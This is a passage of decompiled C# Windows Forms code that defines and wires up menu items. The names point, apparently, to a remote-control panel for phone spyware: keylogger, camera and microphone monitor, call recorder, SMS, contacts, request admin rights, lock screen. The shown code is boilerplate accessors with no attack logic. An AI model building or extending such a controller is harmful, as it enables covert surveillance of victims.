					smstoolStripMenuItem.Click -= value2;
				}
				this._SMSToolStripMenuItem = value;
				smstoolStripMenuItem = this._SMSToolStripMenuItem;
				if (smstoolStripMenuItem != null)
				{
					smstoolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001EE RID: 494
		// (get) Token: 0x060007AE RID: 1966 RVA: 0x000058C5 File Offset: 0x00003AC5
		// (set) Token: 0x060007AF RID: 1967 RVA: 0x0003DAEC File Offset: 0x0003BCEC
		internal virtual ToolStripMenuItem CallsToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._CallsToolStripMenuItem1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.CallsToolStripMenuItem1_Click);
				ToolStripMenuItem callsToolStripMenuItem = this._CallsToolStripMenuItem1;
				if (callsToolStripMenuItem != null)
				{
					callsToolStripMenuItem.Click -= value2;
				}
				this._CallsToolStripMenuItem1 = value;
				callsToolStripMenuItem = this._CallsToolStripMenuItem1;
				if (callsToolStripMenuItem != null)
				{
					callsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001EF RID: 495
		// (get) Token: 0x060007B0 RID: 1968 RVA: 0x000058CD File Offset: 0x00003ACD
		// (set) Token: 0x060007B1 RID: 1969 RVA: 0x0003DB30 File Offset: 0x0003BD30
		internal virtual ToolStripMenuItem ContactsToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._ContactsToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.ContactsToolStripMenuItem_Click);
				ToolStripMenuItem contactsToolStripMenuItem = this._ContactsToolStripMenuItem;
				if (contactsToolStripMenuItem != null)
				{
					contactsToolStripMenuItem.Click -= value2;
				}
				this._ContactsToolStripMenuItem = value;
				contactsToolStripMenuItem = this._ContactsToolStripMenuItem;
				if (contactsToolStripMenuItem != null)
				{
					contactsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001F0 RID: 496
		// (get) Token: 0x060007B2 RID: 1970 RVA: 0x000058D5 File Offset: 0x00003AD5
		// (set) Token: 0x060007B3 RID: 1971 RVA: 0x0003DB74 File Offset: 0x0003BD74
		internal virtual ToolStripMenuItem AccountsToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._AccountsToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.AccountsToolStripMenuItem_Click);
				ToolStripMenuItem accountsToolStripMenuItem = this._AccountsToolStripMenuItem;
				if (accountsToolStripMenuItem != null)
				{
					accountsToolStripMenuItem.Click -= value2;
				}
				this._AccountsToolStripMenuItem = value;
				accountsToolStripMenuItem = this._AccountsToolStripMenuItem;
				if (accountsToolStripMenuItem != null)
				{
					accountsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001F1 RID: 497
		// (get) Token: 0x060007B4 RID: 1972 RVA: 0x000058DD File Offset: 0x00003ADD
		// (set) Token: 0x060007B5 RID: 1973 RVA: 0x0003DBB8 File Offset: 0x0003BDB8
		internal virtual ToolStripMenuItem ApplicationsToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._ApplicationsToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.ApplicationsToolStripMenuItem_Click);
				ToolStripMenuItem applicationsToolStripMenuItem = this._ApplicationsToolStripMenuItem;
				if (applicationsToolStripMenuItem != null)
				{
					applicationsToolStripMenuItem.Click -= value2;
				}
				this._ApplicationsToolStripMenuItem = value;
				applicationsToolStripMenuItem = this._ApplicationsToolStripMenuItem;
				if (applicationsToolStripMenuItem != null)
				{
					applicationsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001F2 RID: 498
		// (get) Token: 0x060007B6 RID: 1974 RVA: 0x000058E5 File Offset: 0x00003AE5
		// (set) Token: 0x060007B7 RID: 1975 RVA: 0x0003DBFC File Offset: 0x0003BDFC
		internal virtual ToolStripMenuItem ToolStripMenuItem12
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripMenuItem12;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem12_Click);
				ToolStripMenuItem toolStripMenuItem = this._ToolStripMenuItem12;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click -= value2;
				}
				this._ToolStripMenuItem12 = value;
				toolStripMenuItem = this._ToolStripMenuItem12;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001F3 RID: 499
		// (get) Token: 0x060007B8 RID: 1976 RVA: 0x000058ED File Offset: 0x00003AED
		// (set) Token: 0x060007B9 RID: 1977 RVA: 0x0003DC40 File Offset: 0x0003BE40
		internal virtual ToolStripSeparator ToolStripSeparator1 { get; set; }

		// Token: 0x170001F4 RID: 500
		// (get) Token: 0x060007BA RID: 1978 RVA: 0x000058F5 File Offset: 0x00003AF5
		// (set) Token: 0x060007BB RID: 1979 RVA: 0x0003DC54 File Offset: 0x0003BE54
		internal virtual ToolStripMenuItem MonitorsToolStripMenuItem { get; set; }

		// Token: 0x170001F5 RID: 501
		// (get) Token: 0x060007BC RID: 1980 RVA: 0x000058FD File Offset: 0x00003AFD
		// (set) Token: 0x060007BD RID: 1981 RVA: 0x0003DC68 File Offset: 0x0003BE68
		internal virtual ToolStripMenuItem ScreenMonitorToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._ScreenMonitorToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.ScreenMonitorToolStripMenuItem_Click);
				ToolStripMenuItem screenMonitorToolStripMenuItem = this._ScreenMonitorToolStripMenuItem;
				if (screenMonitorToolStripMenuItem != null)
				{
					screenMonitorToolStripMenuItem.Click -= value2;
				}
				this._ScreenMonitorToolStripMenuItem = value;
				screenMonitorToolStripMenuItem = this._ScreenMonitorToolStripMenuItem;
				if (screenMonitorToolStripMenuItem != null)
				{
					screenMonitorToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001F6 RID: 502
		// (get) Token: 0x060007BE RID: 1982 RVA: 0x00005905 File Offset: 0x00003B05
		// (set) Token: 0x060007BF RID: 1983 RVA: 0x0003DCAC File Offset: 0x0003BEAC
		internal virtual ToolStripMenuItem ScreenReaderToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._ScreenReaderToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.ScreenReaderToolStripMenuItem_Click);
				ToolStripMenuItem screenReaderToolStripMenuItem = this._ScreenReaderToolStripMenuItem;
				if (screenReaderToolStripMenuItem != null)
				{
					screenReaderToolStripMenuItem.Click -= value2;
				}
				this._ScreenReaderToolStripMenuItem = value;
				screenReaderToolStripMenuItem = this._ScreenReaderToolStripMenuItem;
				if (screenReaderToolStripMenuItem != null)
				{
					screenReaderToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001F7 RID: 503
		// (get) Token: 0x060007C0 RID: 1984 RVA: 0x0000590D File Offset: 0x00003B0D
		// (set) Token: 0x060007C1 RID: 1985 RVA: 0x0003DCF0 File Offset: 0x0003BEF0
		internal virtual ToolStripMenuItem CameraMonitorToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._CameraMonitorToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.CameraMonitorToolStripMenuItem_Click);
				ToolStripMenuItem cameraMonitorToolStripMenuItem = this._CameraMonitorToolStripMenuItem;
				if (cameraMonitorToolStripMenuItem != null)
				{
					cameraMonitorToolStripMenuItem.Click -= value2;
				}
				this._CameraMonitorToolStripMenuItem = value;
				cameraMonitorToolStripMenuItem = this._CameraMonitorToolStripMenuItem;
				if (cameraMonitorToolStripMenuItem != null)
				{
					cameraMonitorToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001F8 RID: 504
		// (get) Token: 0x060007C2 RID: 1986 RVA: 0x00005915 File Offset: 0x00003B15
		// (set) Token: 0x060007C3 RID: 1987 RVA: 0x0003DD34 File Offset: 0x0003BF34
		internal virtual ToolStripMenuItem MicrophoneMonitorToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._MicrophoneMonitorToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.MicrophoneMonitorToolStripMenuItem_Click);
				ToolStripMenuItem microphoneMonitorToolStripMenuItem = this._MicrophoneMonitorToolStripMenuItem;
				if (microphoneMonitorToolStripMenuItem != null)
				{
					microphoneMonitorToolStripMenuItem.Click -= value2;
				}
				this._MicrophoneMonitorToolStripMenuItem = value;
				microphoneMonitorToolStripMenuItem = this._MicrophoneMonitorToolStripMenuItem;
				if (microphoneMonitorToolStripMenuItem != null)
				{
					microphoneMonitorToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001F9 RID: 505
		// (get) Token: 0x060007C4 RID: 1988 RVA: 0x0000591D File Offset: 0x00003B1D
		// (set) Token: 0x060007C5 RID: 1989 RVA: 0x0003DD78 File Offset: 0x0003BF78
		internal virtual ToolStripMenuItem KeyloggerToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._KeyloggerToolStripMenuItem1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.KeyloggerToolStripMenuItem1_Click);
				ToolStripMenuItem keyloggerToolStripMenuItem = this._KeyloggerToolStripMenuItem1;
				if (keyloggerToolStripMenuItem != null)
				{
					keyloggerToolStripMenuItem.Click -= value2;
				}
				this._KeyloggerToolStripMenuItem1 = value;
				keyloggerToolStripMenuItem = this._KeyloggerToolStripMenuItem1;
				if (keyloggerToolStripMenuItem != null)
				{
					keyloggerToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001FA RID: 506
		// (get) Token: 0x060007C6 RID: 1990 RVA: 0x00005925 File Offset: 0x00003B25
		// (set) Token: 0x060007C7 RID: 1991 RVA: 0x0003DDBC File Offset: 0x0003BFBC
		internal virtual ToolStripMenuItem LocationsMonitorToolStripMenuItem { get; set; }

		// Token: 0x170001FB RID: 507
		// (get) Token: 0x060007C8 RID: 1992 RVA: 0x0000592D File Offset: 0x00003B2D
		// (set) Token: 0x060007C9 RID: 1993 RVA: 0x0003DDD0 File Offset: 0x0003BFD0
		internal virtual ToolStripMenuItem LiveModeToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._LiveModeToolStripMenuItem1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.LiveModeToolStripMenuItem1_Click);
				ToolStripMenuItem liveModeToolStripMenuItem = this._LiveModeToolStripMenuItem1;
				if (liveModeToolStripMenuItem != null)
				{
					liveModeToolStripMenuItem.Click -= value2;
				}
				this._LiveModeToolStripMenuItem1 = value;
				liveModeToolStripMenuItem = this._LiveModeToolStripMenuItem1;
				if (liveModeToolStripMenuItem != null)
				{
					liveModeToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001FC RID: 508
		// (get) Token: 0x060007CA RID: 1994 RVA: 0x00005935 File Offset: 0x00003B35
		// (set) Token: 0x060007CB RID: 1995 RVA: 0x0003DE14 File Offset: 0x0003C014
		internal virtual ToolStripSeparator ToolStripSeparator2 { get; set; }

		// Token: 0x170001FD RID: 509
		// (get) Token: 0x060007CC RID: 1996 RVA: 0x0000593D File Offset: 0x00003B3D
		// (set) Token: 0x060007CD RID: 1997 RVA: 0x0003DE28 File Offset: 0x0003C028
		internal virtual ToolStripMenuItem SilentModeGOIPToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._SilentModeGOIPToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.SilentModeGOIPToolStripMenuItem_Click);
				ToolStripMenuItem silentModeGOIPToolStripMenuItem = this._SilentModeGOIPToolStripMenuItem;
				if (silentModeGOIPToolStripMenuItem != null)
				{
					silentModeGOIPToolStripMenuItem.Click -= value2;
				}
				this._SilentModeGOIPToolStripMenuItem = value;
				silentModeGOIPToolStripMenuItem = this._SilentModeGOIPToolStripMenuItem;
				if (silentModeGOIPToolStripMenuItem != null)
				{
					silentModeGOIPToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001FE RID: 510
		// (get) Token: 0x060007CE RID: 1998 RVA: 0x00005945 File Offset: 0x00003B45
		// (set) Token: 0x060007CF RID: 1999 RVA: 0x0003DE6C File Offset: 0x0003C06C
		internal virtual ToolStripMenuItem WebBrowserToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._WebBrowserToolStripMenuItem1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.WebBrowserToolStripMenuItem1_Click);
				ToolStripMenuItem webBrowserToolStripMenuItem = this._WebBrowserToolStripMenuItem1;
				if (webBrowserToolStripMenuItem != null)
				{
					webBrowserToolStripMenuItem.Click -= value2;
				}
				this._WebBrowserToolStripMenuItem1 = value;
				webBrowserToolStripMenuItem = this._WebBrowserToolStripMenuItem1;
				if (webBrowserToolStripMenuItem != null)
				{
					webBrowserToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001FF RID: 511
		// (get) Token: 0x060007D0 RID: 2000 RVA: 0x0000594D File Offset: 0x00003B4D
		// (set) Token: 0x060007D1 RID: 2001 RVA: 0x0003DEB0 File Offset: 0x0003C0B0
		internal virtual ToolStripMenuItem CallRecorderToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._CallRecorderToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.CallRecorderToolStripMenuItem_Click);
				ToolStripMenuItem callRecorderToolStripMenuItem = this._CallRecorderToolStripMenuItem;
				if (callRecorderToolStripMenuItem != null)
				{
					callRecorderToolStripMenuItem.Click -= value2;
				}
				this._CallRecorderToolStripMenuItem = value;
				callRecorderToolStripMenuItem = this._CallRecorderToolStripMenuItem;
				if (callRecorderToolStripMenuItem != null)
				{
					callRecorderToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000200 RID: 512
		// (get) Token: 0x060007D2 RID: 2002 RVA: 0x00005955 File Offset: 0x00003B55
		// (set) Token: 0x060007D3 RID: 2003 RVA: 0x0003DEF4 File Offset: 0x0003C0F4
		internal virtual ToolStripMenuItem ToolStripMenuItem3
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripMenuItem3;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem3_Click);
				ToolStripMenuItem toolStripMenuItem = this._ToolStripMenuItem3;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click -= value2;
				}
				this._ToolStripMenuItem3 = value;
				toolStripMenuItem = this._ToolStripMenuItem3;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000201 RID: 513
		// (get) Token: 0x060007D4 RID: 2004 RVA: 0x0000595D File Offset: 0x00003B5D
		// (set) Token: 0x060007D5 RID: 2005 RVA: 0x0003DF38 File Offset: 0x0003C138
		internal virtual ToolStripSeparator ToolStripSeparator3 { get; set; }

		// Token: 0x17000202 RID: 514
		// (get) Token: 0x060007D6 RID: 2006 RVA: 0x00005965 File Offset: 0x00003B65
		// (set) Token: 0x060007D7 RID: 2007 RVA: 0x0003DF4C File Offset: 0x0003C14C
		internal virtual ToolStripMenuItem AdminToolStripMenuItem { get; set; }

		// Token: 0x17000203 RID: 515
		// (get) Token: 0x060007D8 RID: 2008 RVA: 0x0000596D File Offset: 0x00003B6D
		// (set) Token: 0x060007D9 RID: 2009 RVA: 0x0003DF60 File Offset: 0x0003C160
		internal virtual ToolStripMenuItem RequestAdminRightsToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._RequestAdminRightsToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.RequestAdminRightsToolStripMenuItem_Click);
				ToolStripMenuItem requestAdminRightsToolStripMenuItem = this._RequestAdminRightsToolStripMenuItem;
				if (requestAdminRightsToolStripMenuItem != null)
				{
					requestAdminRightsToolStripMenuItem.Click -= value2;
				}
				this._RequestAdminRightsToolStripMenuItem = value;
				requestAdminRightsToolStripMenuItem = this._RequestAdminRightsToolStripMenuItem;
				if (requestAdminRightsToolStripMenuItem != null)
				{
					requestAdminRightsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000204 RID: 516
		// (get) Token: 0x060007DA RID: 2010 RVA: 0x00005975 File Offset: 0x00003B75
		// (set) Token: 0x060007DB RID: 2011 RVA: 0x0003DFA4 File Offset: 0x0003C1A4
		internal virtual ToolStripMenuItem LockScreenToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._LockScreenToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.LockScreenToolStripMenuItem_Click);
				ToolStripMenuItem lockScreenToolStripMenuItem = this._LockScreenToolStripMenuItem;
				if (lockScreenToolStripMenuItem != null)
				{
					lockScreenToolStripMenuItem.Click -= value2;
				}
				this._LockScreenToolStripMenuItem = value;
				lockScreenToolStripMenuItem = this._LockScreenToolStripMenuItem;
				if (lockScreenToolStripMenuItem != null)
				{
					lockScreenToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000205 RID: 517
		// (get) Token: 0x060007DC RID: 2012 RVA: 0x0000597D File Offset: 0x00003B7D
		// (set) Token: 0x060007DD RID: 2013 RVA: 0x0003DFE8 File Offset: 0x0003C1E8
		internal virtual ToolStripMenuItem ToolStripMenuItem2
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripMenuItem2;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem2_Click);
				ToolStripMenuItem toolStripMenuItem = this._ToolStripMenuItem2;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click -= value2;
				}
				this._ToolStripMenuItem2 = value;
				toolStripMenuItem = this._ToolStripMenuItem2;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000206 RID: 518
		// (get) Token: 0x060007DE RID: 2014 RVA: 0x00005985 File Offset: 0x00003B85
		// (set) Token: 0x060007DF RID: 2015 RVA: 0x0003E02C File Offset: 0x0003C22C
		internal virtual ToolStripSeparator ToolStripSeparator6 { get; set; }

		// Token: 0x17000207 RID: 519
		// (get) Token: 0x060007E0 RID: 2016 RVA: 0x0000598D File Offset: 0x00003B8D
		// (set) Token: 0x060007E1 RID: 2017 RVA: 0x0003E040 File Offset: 0x0003C240
		internal virtual ToolStripMenuItem ToolStripMenuItem4 { get; set; }

		// Token: 0x17000208 RID: 520
		// (get) Token: 0x060007E2 RID: 2018 RVA: 0x00005995 File Offset: 0x00003B95
		// (set) Token: 0x060007E3 RID: 2019 RVA: 0x0003E054 File Offset: 0x0003C254
		internal virtual ToolStripMenuItem ToolStripMenuItem5
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripMenuItem5;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem5_Click);
				ToolStripMenuItem toolStripMenuItem = this._ToolStripMenuItem5;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click -= value2;
				}
				this._ToolStripMenuItem5 = value;
				toolStripMenuItem = this._ToolStripMenuItem5;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000209 RID: 521
		// (get) Token: 0x060007E4 RID: 2020 RVA: 0x0000599D File Offset: 0x00003B9D
		// (set) Token: 0x060007E5 RID: 2021 RVA: 0x0003E098 File Offset: 0x0003C298
		internal virtual ToolStripMenuItem ToolStripMenuItem6
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripMenuItem6;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem6_Click);
				ToolStripMenuItem toolStripMenuItem = this._ToolStripMenuItem6;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click -= value2;
				}
				this._ToolStripMenuItem6 = value;
				toolStripMenuItem = this._ToolStripMenuItem6;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700020A RID: 522
		// (get) Token: 0x060007E6 RID: 2022 RVA: 0x000059A5 File Offset: 0x00003BA5
		// (set) Token: 0x060007E7 RID: 2023 RVA: 0x0003E0DC File Offset: 0x0003C2DC
		internal virtual ToolStripMenuItem ToolStripMenuItem7
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripMenuItem7;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem7_Click);
				ToolStripMenuItem toolStripMenuItem = this._ToolStripMenuItem7;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click -= value2;
				}
				this._ToolStripMenuItem7 = value;
				toolStripMenuItem = this._ToolStripMenuItem7;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700020B RID: 523
		// (get) Token: 0x060007E8 RID: 2024 RVA: 0x000059AD File Offset: 0x00003BAD
		// (set) Token: 0x060007E9 RID: 2025 RVA: 0x0003E120 File Offset: 0x0003C320
		internal virtual ToolStripMenuItem ToolStripMenuItem8
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripMenuItem8;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem8_Click);
				ToolStripMenuItem toolStripMenuItem = this._ToolStripMenuItem8;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click -= value2;
				}
				this._ToolStripMenuItem8 = value;
				toolStripMenuItem = this._ToolStripMenuItem8;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700020C RID: 524
		// (get) Token: 0x060007EA RID: 2026 RVA: 0x000059B5 File Offset: 0x00003BB5
		// (set) Token: 0x060007EB RID: 2027 RVA: 0x0003E164 File Offset: 0x0003C364
		internal virtual ToolStripMenuItem ToolStripMenuItem9
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripMenuItem9;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem9_Click);
				ToolStripMenuItem toolStripMenuItem = this._ToolStripMenuItem9;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click -= value2;
				}
				this._ToolStripMenuItem9 = value;
				toolStripMenuItem = this._ToolStripMenuItem9;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700020D RID: 525
		// (get) Token: 0x060007EC RID: 2028 RVA: 0x000059BD File Offset: 0x00003BBD
		// (set) Token: 0x060007ED RID: 2029 RVA: 0x0003E1A8 File Offset: 0x0003C3A8
		internal virtual ToolStripMenuItem ToolStripMenuItem10
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripMenuItem10;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem10_Click);
				ToolStripMenuItem toolStripMenuItem = this._ToolStripMenuItem10;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click -= value2;
				}
				this._ToolStripMenuItem10 = value;
				toolStripMenuItem = this._ToolStripMenuItem10;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700020E RID: 526
		// (get) Token: 0x060007EE RID: 2030 RVA: 0x000059C5 File Offset: 0x00003BC5
		// (set) Token: 0x060007EF RID: 2031 RVA: 0x0003E1EC File Offset: 0x0003C3EC
		internal virtual ToolStripSeparator ToolStripSeparator5 { get; set; }

		// Token: 0x1700020F RID: 527
		// (get) Token: 0x060007F0 RID: 2032 RVA: 0x000059CD File Offset: 0x00003BCD
		// (set) Token: 0x060007F1 RID: 2033 RVA: 0x0003E200 File Offset: 0x0003C400
		internal virtual ToolStripMenuItem ExtraToolStripMenuItem { get; set; }

		// Token: 0x17000210 RID: 528
		// (get) Token: 0x060007F2 RID: 2034 RVA: 0x000059D5 File Offset: 0x00003BD5
		// (set) Token: 0x060007F3 RID: 2035 RVA: 0x0003E214 File Offset: 0x0003C414
		internal virtual ToolStripMenuItem NotificationListnerToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._NotificationListnerToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.NotificationListnerToolStripMenuItem_Click);
				ToolStripMenuItem notificationListnerToolStripMenuItem = this._NotificationListnerToolStripMenuItem;
				if (notificationListnerToolStripMenuItem != null)
				{
					notificationListnerToolStripMenuItem.Click -= value2;
				}
				this._NotificationListnerToolStripMenuItem = value;
				notificationListnerToolStripMenuItem = this._NotificationListnerToolStripMenuItem;
				if (notificationListnerToolStripMenuItem != null)
				{
					notificationListnerToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000211 RID: 529
		// (get) Token: 0x060007F4 RID: 2036 RVA: 0x000059DD File Offset: 0x00003BDD
		// (set) Token: 0x060007F5 RID: 2037 RVA: 0x0003E258 File Offset: 0x0003C458
		internal virtual ToolStripMenuItem CallsListnerToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._CallsListnerToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.CallsListnerToolStripMenuItem_Click);
				ToolStripMenuItem callsListnerToolStripMenuItem = this._CallsListnerToolStripMenuItem;
				if (callsListnerToolStripMenuItem != null)
				{
					callsListnerToolStripMenuItem.Click -= value2;
				}
				this._CallsListnerToolStripMenuItem = value;
				callsListnerToolStripMenuItem = this._CallsListnerToolStripMenuItem;
				if (callsListnerToolStripMenuItem != null)
				{
					callsListnerToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000212 RID: 530
		// (get) Token: 0x060007F6 RID: 2038 RVA: 0x000059E5 File Offset: 0x00003BE5
		// (set) Token: 0x060007F7 RID: 2039 RVA: 0x0003E29C File Offset: 0x0003C49C
		internal virtual ToolStripMenuItem SocialMediaHanterToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._SocialMediaHanterToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.SocialMediaHanterToolStripMenuItem_Click);
				ToolStripMenuItem socialMediaHanterToolStripMenuItem = this._SocialMediaHanterToolStripMenuItem;
				if (socialMediaHanterToolStripMenuItem != null)
				{
					socialMediaHanterToolStripMenuItem.Click -= value2;
				}
				this._SocialMediaHanterToolStripMenuItem = value;
				socialMediaHanterToolStripMenuItem = this._SocialMediaHanterToolStripMenuItem;
				if (socialMediaHanterToolStripMenuItem != null)
				{
					socialMediaHanterToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000213 RID: 531
		// (get) Token: 0x060007F8 RID: 2040 RVA: 0x000059ED File Offset: 0x00003BED
		// (set) Token: 0x060007F9 RID: 2041 RVA: 0x0003E2E0 File Offset: 0x0003C4E0
		internal virtual ToolStripMenuItem PhoneInformationToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._PhoneInformationToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.PhoneInformationToolStripMenuItem_Click);
				ToolStripMenuItem phoneInformationToolStripMenuItem = this._PhoneInformationToolStripMenuItem;
				if (phoneInformationToolStripMenuItem != null)
				{
					phoneInformationToolStripMenuItem.Click -= value2;
				}
				this._PhoneInformationToolStripMenuItem = value;
				phoneInformationToolStripMenuItem = this._PhoneInformationToolStripMenuItem;
				if (phoneInformationToolStripMenuItem != null)
				{
					phoneInformationToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000214 RID: 532
		// (get) Token: 0x060007FA RID: 2042 RVA: 0x000059F5 File Offset: 0x00003BF5
		// (set) Token: 0x060007FB RID: 2043 RVA: 0x0003E324 File Offset: 0x0003C524
		internal virtual ToolStripSeparator ToolStripSeparator7 { get; set; }

		// Token: 0x17000215 RID: 533
		// (get) Token: 0x060007FC RID: 2044 RVA: 0x000059FD File Offset: 0x00003BFD
		// (set) Token: 0x060007FD RID: 2045 RVA: 0x0003E338 File Offset: 0x0003C538
		internal virtual ToolStripMenuItem ToolStripMenuItem13 { get; set; }

		// Token: 0x17000216 RID: 534
		// (get) Token: 0x060007FE RID: 2046 RVA: 0x00005A05 File Offset: 0x00003C05
		// (set) Token: 0x060007FF RID: 2047 RVA: 0x0003E34C File Offset: 0x0003C54C
		internal virtual ToolStripMenuItem ToolStripMenuItem16
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripMenuItem16;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem16_Click);
				ToolStripMenuItem toolStripMenuItem = this._ToolStripMenuItem16;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click -= value2;
				}
				this._ToolStripMenuItem16 = value;
				toolStripMenuItem = this._ToolStripMenuItem16;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000217 RID: 535
		// (get) Token: 0x06000800 RID: 2048 RVA: 0x00005A0D File Offset: 0x00003C0D
		// (set) Token: 0x06000801 RID: 2049 RVA: 0x0003E390 File Offset: 0x0003C590
		internal virtual ToolStripMenuItem ToolStripMenuItem17
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripMenuItem17;
